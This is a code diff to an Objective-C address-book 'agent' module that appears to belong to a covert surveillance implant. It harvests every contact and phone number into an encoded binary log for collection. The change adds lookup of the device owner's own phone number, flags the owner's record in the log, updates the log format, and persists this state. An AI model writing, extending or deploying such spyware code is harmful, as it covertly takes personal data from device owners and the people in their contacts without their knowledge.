@@ -8,6 +8,7 @@
  */
 
 #import <AddressBook/AddressBook.h>
+#import <unistd.h>
 #import <sys/types.h>
 #import <pwd.h>
 
@@ -16,32 +17,35 @@
 
 //#define DEBUG
 
+int seteuid(uid_t euid);
+
 NSString *k_i_AgentAddressBookRunLoopMode = @"k_i_AgentAddressBookRunLoopMode";
 
 typedef struct _Names {
-#define   CONTACTNAME    0xC025  
+#define CONTACTNAME   0xC025
   int     magic;  
   int     len;
   //wchar_t buffer[1];
 } Names;
 
 typedef struct _ABNumbers {
-#define   CONTACTNUM    0xC024  
+#define CONTACTNUM    0xC024  
   int     magic;
   int     type;
   //Names   number;
 } ABNumbers;
 
 typedef struct _ABContats {
-#define   CONTACTCNT    0xC023 
+#define CONTACTCNT    0xC023 
   int         magic;
   int         numContats;
   //ABNumbers contact[1];
 } ABContats;
 
 typedef struct _ABFile {
-#define     CONTACTFILE 0xC022  
+#define CONTACTFILE   0xC022
   int       magic;
+  int       flag; //= 0x80000000 if ourself
   int       len;
   //Names      first;
   //Names      last;
@@ -50,6 +54,7 @@ typedef struct _ABFile {
 
 typedef struct _ABLogStrcut {
 #define   CONTACTLIST   0xC021
+#define   CONTACTLIST_2 0x1000C021
   int     magic;
   int     len;
   int     numRecords;
@@ -115,18 +120,18 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
   NSNumber *number = [[NSNumber alloc] initWithDouble: mLastABDateTime];
-  NSDictionary *abDict      = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: number, nil]
-                                                            forKeys: [NSArray arrayWithObjects: @"AB_LASTMODIFIED", nil]];
-//  NSDictionary *agentDict   = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: abDict, nil]
-//                                                            forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
+  NSNumber *myPhoneContact = [[NSNumber alloc] initWithBool: mIsMyContactSaved];
   
-  //setRcsPropertyWithName([[self class] description], agentDict);
+  NSDictionary *abDict = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: number, myPhoneContact, nil]
+                                                       forKeys: [NSArray arrayWithObjects: @"AB_LASTMODIFIED", @"AB_MYCONTACT", nil]];
+
   [[_i_Utils sharedInstance] setPropertyWithName:[[self class] description]
                                   withDictionary:abDict];
-  
-//  [agentDict release];
+
   [abDict release];
-  [number release]; 
+  [number release];
+  [myPhoneContact release];
+  
   [pool release];
   
   return YES;
@@ -137,8 +142,7 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   NSDictionary *agentDict = nil;
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-  //agentDict = rcsPropertyWithName([[self class] description]);
+
   agentDict = [[_i_Utils sharedInstance] getPropertyWithName:[[self class] description]];
   
   if (agentDict == nil) 
@@ -147,7 +151,9 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
     }
   else 
     {
-      mLastABDateTime = [[agentDict objectForKey: @"AB_LASTMODIFIED"] doubleValue];
+      mLastABDateTime   = [[agentDict objectForKey: @"AB_LASTMODIFIED"] doubleValue];
+      mIsMyContactSaved = [[agentDict objectForKey: @"AB_MYCONTACT"] boolValue];
+      
       [agentDict release];
     }
 
@@ -189,7 +195,7 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   Names       abNames;
   
   // setting magic
-  header.magic    = CONTACTLIST;
+  header.magic    = CONTACTLIST_2;
   abFile.magic    = CONTACTFILE; 
   abContat.magic  = CONTACTCNT;
   abNumber.magic  = CONTACTNUM;
@@ -208,9 +214,16 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
       NSString *firstN    = [rec objectForKey: @"First"];
       NSString *lastN     = [rec objectForKey: @"Last"];
       NSMutableArray *num = [rec objectForKey: @"Numbers"];
+      NSString *isMyNumber= [rec objectForKey: @"IsMyNumber"];
       
       // New contact
       abFile.len   = 0;
+      
+      if (isMyNumber == @"YES")
+        abFile.flag = 0x80000000;
+      else
+        abFile.flag = 0x0;
+      
       [abData appendBytes: (const void *) &abFile length: sizeof(abFile)];
       
       // FirstName abNames
@@ -248,7 +261,6 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   // Setting len of NSData - sizeof(magic)
   ABLogStrcut *logS = (ABLogStrcut *) [abData bytes];
   logS->len = [abData length] - (sizeof(logS->magic) + sizeof(logS->len));
-  
 
   _i_LogManager *logManager = [_i_LogManager sharedInstance];
   
@@ -273,6 +285,58 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   return YES;
 }
 
+- (NSMutableString*)strippedPhoneNumber:(NSString*)theNumber
+{
+  NSMutableString *stripped = [NSMutableString stringWithCapacity:0];
+  
+  unichar buff[255];
+  
+  for (int i=0; i<[theNumber lengthOfBytesUsingEncoding: NSUTF8StringEncoding]; i++)
+  {
+    NSRange range;
+    
+    range.length = 1;
+    range.location = i;
+    
+    [theNumber getCharacters:buff range:range];
+
+    if (buff[0] <= '9' && buff[0] >= '0')
+    {
+      NSString *tmpString = [NSString stringWithCharacters: buff length:1];
+      [stripped appendString: tmpString];
+    }
+  }
+  
+  return stripped;
+}
+
+- (BOOL)isMyPhoneNumber:(NSMutableArray*)theNumbers
+{
+  BOOL retVal = FALSE;
+  
+  for (int i=0; i< [theNumbers count]; i++)
+  {
+    id obj = [theNumbers objectAtIndex:i];
+    
+    NSString *_num = [obj objectForKey: @"Number"];
+    
+    NSString *num  = [self strippedPhoneNumber: _num];
+    
+    if (mMyPhoneNumber != nil)
+    {
+      NSRange range = [mMyPhoneNumber rangeOfString:num] ;
+      
+      if (range.location != NSNotFound)
+      {
+        retVal = TRUE;
+        break;
+      }
+    }
+  }
+  
+  return retVal;
+}
+
 - (NSMutableArray*)getABNumbers:(ABMutableMultiValueRef)multi
 {
   NSMutableArray  *numbers = nil;
@@ -284,6 +348,7 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   for (CFIndex i = 0; i < ABMultiValueGetCount(multi); i++) 
     {
       phoneNumberLabel = ABMultiValueCopyLabelAtIndex(multi, i);
+      
       if (phoneNumberLabel == NULL) 
         continue;
     
@@ -294,11 +359,13 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
           CFRELEASE(phoneNumberLabel);
           continue;
         }
-    
-      telNum = [[NSDictionary alloc] initWithObjectsAndKeys: (id)phoneNumberLabel, 
-                                                             @"Label", 
+  
+      telNum = [[NSDictionary alloc] initWithObjectsAndKeys: (id)phoneNumberLabel,
+                                                             @"Label",
                                                              phoneNumber, 
-                                                             @"Number", nil]; 
+                                                             @"Number",
+                                                             nil];
+      
       [numbers addObject: telNum];
       
       [telNum release];
@@ -389,15 +456,25 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
               
               NSMutableArray *numbers = [self getABNumbers:multi];
               
+              NSString *isMyNumber = @"NO";
+              
+              if ([self isMyPhoneNumber: numbers] == TRUE)
+              {
+                mIsMyContactSaved = TRUE;
+                isMyNumber = @"YES";
+              }
+              
               NSArray *objects = 
                 [NSArray arrayWithObjects:(firstName != NULL ? (id)firstName : (id)nullName), 
                                           (lastName  != NULL ? (id)lastName  : (id)nullName),
-                                          numbers,  
+                                          numbers,
+                                          isMyNumber,
                                           nil];
               
               NSArray *keys = [NSArray arrayWithObjects: @"First", 
                                                          @"Last", 
-                                                         @"Numbers", 
+                                                         @"Numbers",
+                                                         @"IsMyNumber",
                                                          nil];
               
               rec = [[NSDictionary alloc] initWithObjects: objects forKeys: keys];
@@ -478,6 +555,8 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   
   if (self != nil)
     {
+      mMyPhoneNumber = nil;
+      mIsMyContactSaved = FALSE;
       mLastABDateTime = 0;
       abChanges = 0;
       mAgentID = AGENT_ADDRESSBOOK;
@@ -516,11 +595,17 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   
   [self _getAgentABProperty];
 
+  if (mIsMyContactSaved == FALSE)
+  {
+    mMyPhoneNumber = [[[_i_Utils sharedInstance] getPhoneNumber] retain];
+  }
+  
   ABAddressBookRef addressBook = [self _getAddressBookRef];
   
   if (addressBook == NULL) 
     {
-      [self setMAgentStatus: AGENT_STATUS_STOPPED];  
+      [self setMAgentStatus: AGENT_STATUS_STOPPED];
+      [mMyPhoneNumber release];
       [outerPool release];
       return;
     }
@@ -541,6 +626,10 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
     }
   
   CFRELEASE(addressBook);
+  
+  [mMyPhoneNumber release];
+  
+  mMyPhoneNumber = nil;
   
   [self setMAgentStatus: AGENT_STATUS_STOPPED];
   
